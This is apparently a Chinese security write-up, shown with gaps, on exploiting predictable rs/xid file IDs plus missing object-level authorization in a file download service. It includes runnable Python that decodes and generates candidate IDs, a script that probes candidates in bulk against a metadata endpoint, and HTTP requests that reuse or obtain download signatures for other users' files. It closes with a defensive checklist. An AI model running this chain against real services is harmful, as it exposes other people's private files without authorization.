看到这里，至少有三个问题值得验证：  
  
1  
info/v2  
 支持批量，返回  
文件名  
，它校验“这些文件是不是你的”了吗？  
  
2

 给任意

 都签发签名吗？它校验归属了吗？  
  
3

sign  
，那   
sign  
 到底绑定什么？用户？文件？租户？还是只绑定“请求本身”？  
  
先记住一个原则：  
签名不等于授权。  
  
签名解决的是“这个请求有没有被篡改、是不是我签发的”；授权解决的是“这个用户有没有资格访问这个对象”。两者混在一起，就会出现“签名有效，但越权”的经典问题。  
  
另外，下载接口和业务前端不在同一个域名下，说明文件服务是独立部署的一层。独立服务、独立鉴权、独立网关，这类边界往往是  
对象级授权最容易遗漏的地方。  
  
  
03  
  
PART  
  
  
解剖 ID：20 位不是随机数  
  
STRUCTURE · ID 解剖  
  
先看   
fid 的形态(这里为当时真实ID)：  
  
TEXT  
  
danr9o51mb1h14g1s900  
  
danr9o51mb1h14g1s90g  
  
danr9o51mb1h14g1s910  
  
danr9o51mb1h14g1s91g  
  
20 位，小写字母 + 数字，字符集只到   
v，没有   
w/x/y/z。同一时间段的 ID 还有相同的前缀   
dan。  
  
这个前缀不是业务前缀，而是 4 字节  
时间戳的高位在 base32hex 下的稳定映射：同一时期生成的 ID，前几个字符自然相同。  
  
这几个特征放在一起，指向一个很常见的 Go 分布式 ID 库：  
rs/xid。  
  
xid 的结构是固定的 12 字节（大端序）：  
  
TEXT  
  
┌────────────┬──────────┬─────────┬────────────┐  
  
│ 4B 时间戳   │ 3B 机器号 │ 2B 进程 │ 3B 计数器   │  
  
│ Unix 秒     │ machine  │ pid     │ counter    │  
  
└────────────┴──────────┴─────────┴────────────┘  
  
↓ base32hex  
  
20 位字符串  
  
用 base32hex 解码后，字段一目了然。拿一个合成样本来说（真实样本的字段已替换）：  
  
TEXT  
  
fid     : danr9o51mb1h14g1s900  
  
时间戳  : 1789900000  
  
机器号  : a1b2c3  
  
进程号  : 4242  
  
计数器  : 123456  
  
有人会问：凭什么确定是这个结构，而不是巧合？  
  
做一次  
自洽性校验：  
  
•  
解码出的  
时间戳  
，应该和文件上传时间对得上（误差在秒级）；  
  
•  
同一批文件，  
机器号  
和  
进程号  
应该完全一致；  
  
•  
连续上传几个文件，  
计数器  
应该严格递增。  
  
实测结果：  
  
TEXT  
  
时间戳        机器      进程号    计数器  
  
...           a1b2c3    4242     123456  
  
...           a1b2c3    4242     123457   ← +1  
  
...           a1b2c3    4242     123458   ← +1  
  
...           a1b2c3    4242     123459   ← +1  
  
三个条件同时满足，结构就基本坐实了。  
  
这里还有一个容易忽略的点：  
xid 的  
计数器是  
进程内维护的，不是全局自增。它通常从一个随机初值开始，所以不会从 0 起算；但同一进程内严格递增。因此必须把“机器号 + 进程号”放在一起看，不同进程的计数器互不相关。也正因为如此，两个标记文件必须来自同一个进程，才能建立有效的坐标系。  
  
如果一次上传落在不同实例上，  
机器号或  
进程号会不一样。多传几个，按   
machine + pid 分组，找到同一组的两枚即可。

这也是本文最关键的一个认知转变：  
  
不要问“这个 ID 能不能遍历”，要问“这个 ID 是怎么生成的”。  
  
数字自增是  
生成方式，UUID 是生成方式，xid 也是生成方式。只要它是“生成”出来的，就有  
规律；有规律，就可以从“盲猜”变成“推算”。  
  
  
04  
  
PART  
  
  
本地“造 ID”：把爆破变成计算  
  
COMPUTE · 本地推算  
  
有了结构，接下来就是还原生成过程。  
  
xid 的编码是 base32hex，字符集为：  
  
TEXT  
  
0123456789abcdefghijklmnopqrstuv  
  
用 Python 复刻一遍（代码可直接运行）：  
  
PYTHON  
  
ALPHABET = "0123456789abcdefghijklmnopqrstuv"  
  
  
  
def b32hex_encode(data: bytes) -> str:  
  
value = bits = 0  
  
out = []  
  
for byte in data:  
  
value = (value << 8) | byte  
  
bits += 8  
  
while bits >= 5:  
  
bits -= 5  
  
out.append(ALPHABET[(value >> bits) & 0x1F])  
  
if bits:  
  
out.append(ALPHABET[(value << (5 - bits)) & 0x1F])  
  
return "".join(out)  
  
  
  
def b32hex_decode(text: str) -> bytes:  
  
value = bits = 0  
  
out = bytearray()  
  
for ch in text.lower():  
  
value = (value << 5) | ALPHABET.index(ch)  
  
bits += 5  
  
if bits >= 8:  
  
bits -= 8  
  
out.append((value >> bits) & 0xFF)  
  
return bytes(out)  
  
  
  
def xid_decode(fid: str) -> dict:  
  
raw = b32hex_decode(fid)  
  
assert len(raw) == 12, "不是标准 xid"  
  
return {  
  
"ts": int.from_bytes(raw[0:4], "big"),  
  
"machine": raw[4:7].hex(),  
  
"pid": int.from_bytes(raw[7:9], "big"),  
  
"counter": int.from_bytes(raw[9:12], "big"),  
  
}  
  
  
  
def xid_encode(ts: int, machine: str, pid: int, counter: int) -> str:  
  
raw = (  
  
ts.to_bytes(4, "big")  
  
+ bytes.fromhex(machine)  
  
+ pid.to_bytes(2, "big")  
  
+ counter.to_bytes(3, "big")  
  
)  
  
return b32hex_encode(raw)  
  
验证一下：  
  
PYTHON  
  
>>> xid_decode("danr9o51mb1h14g1s900")  
  
{'ts': 1789900000, 'machine': 'a1b2c3', 'pid': 4242, 'counter': 123456}  
  
现在，我们手里有了一个“坐标原点”：  
  
TEXT  
  
(machine=a1b2c3, pid=4242, counter=123456, ts=1789900000)  
  
同一台机器、同一个进程生成的文件，  
machine 和   
pid 不变，变的只有时间戳和  
计数器。于是可以在本地生成  
候选集：  
  
PYTHON  
  
def generate_candidates(marker_a: str, marker_b: str,  
  
ts_pad: int = 60, cnt_pad: int = 50):  
  
a = xid_decode(marker_a)  
  
b = xid_decode(marker_b)  
  
  
# 两个标记文件必须来自同一台机器、同一个进程  
  
assert a["machine"] == b["machine"]  
  
assert a["pid"] == b["pid"]  
  
  
ts_lo = min(a["ts"], b["ts"]) - ts_pad  
  
ts_hi = max(a["ts"], b["ts"]) + ts_pad  
  
cnt_lo = max(0, min(a["counter"], b["counter"]) - cnt_pad)  
  
cnt_hi = min(0xFFFFFF, max(a["counter"], b["counter"]) + cnt_pad)  
  
  
for ts in range(ts_lo, ts_hi + 1):  
  
for cnt in range(cnt_lo, cnt_hi + 1):  
  
yield xid_encode(ts, a["machine"], a["pid"], cnt)  
  
注意，这是  
本地纯计算，零请求。  
  
传统遍历是“拿着 1、2、3 去问服务器”；这里是“先在家把可能的 ID 算出来，再拿一小部分去验证”。  
  
实际测试时，  
窗口不用拍脑袋：  
  
•  
两个  
标记文件  
之间，  
计数器  
差了多少，就说明这个进程在这段时间里大约生成过多少个 ID（包含其他账号的文件）；  
  
•  
时间戳  
的范围，可以由两个  
标记文件  
的上传时间夹住（留几秒误差）；  
  
•

候选集有了，下一步不是一个个下载，而是先验证“哪些 ID 真的存在”。  
  
info/v2 支持逗号  
批量查询，且只返回存在的   
fid，还附带  
真实文件名。这等于给了一个  
批量存在性预言机：  
  
PYTHON  
  
import requests  
  
  
BASE = "https://api.example.com/{service}"  
  
  
  
def batch_probe(fids, batch_size=5000):  
  
hits = []  
  
for i in range(0, len(fids), batch_size):  
  
chunk = fids[i:i + batch_size]  
  
resp = requests.get(  
  
f"{BASE}/api/file/info/v2",  
  
params={"fids": ",".join(chunk)},  
  
timeout=15,  
  
)  
  
resp.raise_for_status()  
  
data = resp.json().get("data") or []  
  
hits.extend(data)  
  
return hits  
  
（示例省略了鉴权头、Cookie 和真实域名；字段结构按实际响应调整。）

•  
一次请求可以验证数千个  
候选  
；  
  
•  
服务端  
只回真实存在的，天然帮你过滤噪音；  
  
•  
返回的不只是“存在”，还有  
文件名  
。

核心改动是   
cos_key；  
sign 可能要重新申请，但申请环节同样  
不校验归属。  
sign 是“通行证”，但它不证明“你有权进这扇门”。  
  
第一步，验证   
sign 和   
cos_key 的绑定关系：  
  
HTTP  
  
GET /{service}/api/file/download/v2?sign=<my_sign>&cos_key=<candidate_fid>&group_id=  
  
如果仍然返回文件流，说明   
sign 不绑定具体文件，只是“某次请求的签名”，换   
cos_key 直接复用。  
  
第二步，如果第一种不成立，就验证  
签发环节：  
  
HTTP  
  
POST /{service}/api/file/gensign  
  
Content-Type: application/json  
  
  
{"fid":"<candidate_fid>"}  
  
如果  
服务端对一个不属于你的   
fid 仍然返回   
sign，那说明：  
签名确实绑定了文件，但签发签名时不校验归属。  
  
这两种实现看起来不同，本质是同一个问题：  
  
方案 A  
  
方案 A：签名不绑资源 → 换   
cos_key 直接过；  
  
方案 B  
  
方案 B：签名绑资源，但   
gensign 对任意资源签发 → 换   
fid 重新签，照样过。  
  
无论哪种，在这套实现里，  
sign 都被当成了“  
访问控制”机制；而它真正能保证的，最多只是“请求完整性 / 防篡改”。  
  
真正的  
访问控制应该发生在  
签发之前：  
  
TEXT  
  
当前用户 → 是否有权访问该 fid → 有，才签发 sign  
  
而不是：  
  
TEXT  
  
任何人 → 报一个 fid → 我给你签 → 你去下载  
  
实测结果：  
sign 不校验  
身份权限，  
group_id 留空也能下载。最终的请求形态是：

200，

这类漏洞的通用检查清单  
  
CHECKLIST · 检查要点  
  
以后遇到任何“对象 ID + 下载 / 详情 / 导出”的接口，可以按下面三步走。  
  
第一步：看 ID 的生成方式  
  
纯数字自增  
  
纯数字自增：直接改，重点看权限；  
  
时间戳 / UUID / 短随机串  
  
时间戳 / UUID / 短随机串：先收集多个样本，看是否有固定前缀、固定长度、固定字符集；  
  
•  
xid / ULID / Snowflake：解码，看是否携带时间、机器、序列号；  
  
加密 / 编码过的 ID  
  
加密 / 编码过的 ID：尝试 base64、base32、hex 解码，看是否能还原出结构化字段。  
  
判断标准不是“看起来随机”，而是“能不能用两个样本推出第三个”。  
  
第二步：看元数据接口的授权  
  
•  
详情、列表、  
批量查询  
、导出，是否都做了  
对象级鉴权  
？  
  
•  
批量参数（  
ids=  
、  
fids=  
）是否支持逗号拼接？是否只返回有权访问的对象？  
  
•  
返回体是否泄露  
文件名  
、大小、创建者、路径等敏感元数据？  
  
很多系统只保护了“下载”，却忘了“查询”；而查询接口往往是最好的枚举器。  
  
第三步：看下载凭证的绑定  
  
把凭证拆成几个维度，一次只换一个：  
  
换对象  
  
换对象：  
cos_key /   
file_id /   
path；  
  
换用户  
  
换用户：A 用户的 sign 给 B 用户用；  
  
换租户  
  
换租户：  
group_id /   
tenant_id /   
org_id 置空或改成别人的；  
  
换动作  
  
换动作：下载的 sign 拿去做预览、导出等只读动作（不要用删除等破坏性动作验证）；  
  
换时间  
  
换时间：过期后是否还能用，是否能重放。  
  
只要有一个维度没绑定，或者绑定前的  
签发环节没鉴权，链条就断了。  
  
记住一句话：  
  
ID   
可预测  
不是漏洞，ID 可预测 +   
对象级鉴权缺失  
，才是漏洞。  
  
单报“ID   
可预测”通常会被判为信息级；只有把它和真实的越权读取链起来，才是有效漏洞。
